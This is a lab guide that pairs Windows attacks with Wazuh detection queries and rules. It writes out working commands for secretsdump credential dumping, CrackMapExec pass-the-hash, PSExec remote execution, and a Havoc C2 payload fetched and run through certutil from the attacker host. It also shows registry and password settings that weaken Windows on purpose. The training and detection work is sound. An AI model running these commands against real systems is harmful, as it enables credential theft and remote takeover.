# Part 2 — Windows Attacks & Wazuh Rules

---

## Kali Tool Check

All tools below are pre-installed on Kali except Havoc. Everything else (impacket, crackmapexec/netexec, hydra, sqlmap, nikto) is ready to use.

> `crackmapexec` and `netexec` / `nxc` are the same tool — use either.

### Install Havoc (one-time)

```bash
sudo apt install -y havoc
```

See [installation/havoc.md](installation/havoc.md) for usage details.

---

## VM Specs (vSphere)

| VM | OS | vCPU | RAM | Disk |
|---|---|---|---|---|
| Kali (attacker) | Kali Linux | 2 | 4 GB | 40 GB |
| Win-VM1 | Windows 10 | 2 | 4 GB | 60 GB |
| Win-VM2 | Windows 10 | 2 | 4 GB | 60 GB |
| Wazuh server | Ubuntu 22.04 | 4 | 8 GB | 50 GB |

All VMs on the same port group in vSphere so they can reach each other.

---

## Connecting to the Windows VMs

**Option 1 — vSphere Web Console (no extra setup)**
Open vSphere Client in browser → right-click VM → Launch Web Console. Works out of the box, no network config needed.

**Option 2 — RDP (more comfortable)**

Enable RDP on each Windows VM via vSphere console first:
```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
Then RDP from any machine on the same network: `mstsc /v:<WIN_VM_IP>`

> For the attacks to work, Kali must be able to reach the Windows VMs over the network (ping test first).

---

## Windows VM Pre-setup (do before the session)

Run on both Windows VMs:

```powershell
# Local admin account — same password on both VMs (this is the point of PTH demo)
net user labadmin Password123 /add
net localgroup administrators labadmin /add

# Allow PTH with local accounts (blocked by default on Win10)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# Open SMB through firewall (needed for secretsdump, PSExec, CME)
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
```

---

## Wazuh Setup

```bash
# Single-node Docker install on Ubuntu server
git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
cd wazuh-docker/single-node
docker compose up -d
```

Dashboard: `https://<WAZUH_IP>` — admin / SecretPassword

---

## Windows Agent Install

Run in PowerShell as Administrator on each VM:

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.3-1.msi -OutFile wazuh-agent.msi
msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="<WAZUH_IP>" WAZUH_AGENT_NAME="Win-VM1"
Start-Service WazuhSvc
```

Change `Win-VM1` to `Win-VM2` on the second machine.

---

## Enable Audit Policies (required)

Run on both Windows VMs — without this most attacks produce no logs:

```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Force
```

---

## Key Event IDs

| ID | Event | Notes |
|---|---|---|
| 4624 | Successful logon | Check Logon Type |
| 4625 | Failed logon | Brute force |
| 4648 | Logon with explicit credentials | PSExec, RunAs |
| 4672 | Special privileges assigned | Admin logon |
| 4688 | New process created | Needs audit policy |
| 4697 | Service installed | PSExec, persistence |
| 7045 | New service (System log) | PSExec |
| 4776 | NTLM credential validation | PTH, secretsdump |
| 4698 | Scheduled task created | Persistence |

**Logon Types**
- 2 = interactive (local)
- 3 = network (SMB) — PTH shows up here
- 10 = RDP

---

## Attack 1 — Credential Dumping (secretsdump)

```bash
impacket-secretsdump labadmin:'Password123'@<WIN_VM1_IP>
# Output: labadmin:1001:aad3b435...:NTLM_HASH:::
# Copy the NT hash — the part after the third colon
```

Events: 4624 (Type 3), 4776

```
data.win.system.eventID: 4776
```

---

## Attack 2 — Pass the Hash (CrackMapExec)

```bash
crackmapexec smb <WIN_VM2_IP> -u labadmin -H <NT_HASH>
crackmapexec smb <WIN_VM2_IP> -u labadmin -H <NT_HASH> -x "whoami"
```

Same hash works on VM2 because both VMs have the same password — that's the whole point.

Events: 4624 (Type 3, NTLM), 4648, 4672

PTH signature in logs:
- LogonType = 3
- AuthenticationPackageName = NTLM
- IpAddress = Kali IP

```
data.win.system.eventID: 4624 AND data.win.eventdata.logonType: 3 AND data.win.eventdata.authenticationPackageName: NTLM
```

---

## Attack 3 — Remote Execution (PSExec)

```bash
impacket-psexec labadmin:'Password123'@<WIN_VM1_IP>
# or with hash
impacket-psexec -hashes :NT_HASH labadmin@<WIN_VM1_IP>
```

Events: 7045 (PSEXESVC service), 4697, 4624, 4688

```
data.win.eventdata.serviceName: PSEXESVC
data.win.system.eventID: 7045
```

---

## Attack 4 — Havoc C2

Havoc is a C2 framework. Team server and client both run on Kali. The Windows VM only runs the demon (the generated payload that calls back to Kali). See [installation/havoc.md](installation/havoc.md) for setup.

```bash
# Terminal 1 — team server (Kali, run as root)
cd /usr/share/havoc
sudo havoc server --profile profiles/havoc.yaotl

# Terminal 2 — client GUI (Kali)
cd /usr/share/havoc
havoc client
```

In Havoc client:
1. View → Listeners → Add — HTTP, Host: `<KALI_IP>`, Port: 80
2. Attack → Payload → Generate — Windows EXE, select listener → save as `demon.exe`

```bash
# Host payload on Kali
cp demon.exe /tmp/
python3 -m http.server 8080 --directory /tmp/
```

On Windows VM in cmd (as Admin):
```cmd
certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
C:\Windows\Temp\demon.exe
```

Demon runs → calls back to Kali → session appears in Havoc client.

Events: 4688 (certutil + urlcache), 4688 (demon.exe spawned from cmd.exe)

```
data.win.eventdata.commandLine: *certutil* AND data.win.eventdata.commandLine: *urlcache*
```

---

## Wazuh Detection Rules

Add to `/var/ossec/etc/rules/local_rules.xml`, then:
```bash
sudo systemctl restart wazuh-manager
```

```xml
<group name="windows,attack,">

  <rule id="100001" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.logonType">^3$</field>
    <field name="win.eventdata.authenticationPackageName">NTLM</field>
    <description>Possible Pass-the-Hash: NTLM network logon</description>
    <mitre><id>T1550.002</id></mitre>
  </rule>

  <rule id="100002" level="10" frequency="5" timeframe="30">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4625$</field>
    <same_field>win.eventdata.ipAddress</same_field>
    <description>Brute force: 5+ failed logons in 30s from same IP</description>
    <mitre><id>T1110</id></mitre>
  </rule>

  <rule id="100003" level="14">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^7045$</field>
    <field name="win.eventdata.serviceName">PSEXESVC</field>
    <description>PSExec service installed</description>
    <mitre><id>T1569.002</id></mitre>
  </rule>

  <rule id="100004" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4688$</field>
    <field name="win.eventdata.newProcessName">certutil.exe</field>
    <field name="win.eventdata.commandLine">urlcache</field>
    <description>Certutil used to download file - possible payload delivery</description>
    <mitre><id>T1105</id></mitre>
  </rule>

  <rule id="100005" level="12" frequency="10" timeframe="10">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4776$</field>
    <same_field>win.eventdata.workstationName</same_field>
    <description>Multiple NTLM validations - possible credential dumping</description>
    <mitre><id>T1003.002</id></mitre>
  </rule>

</group>
```
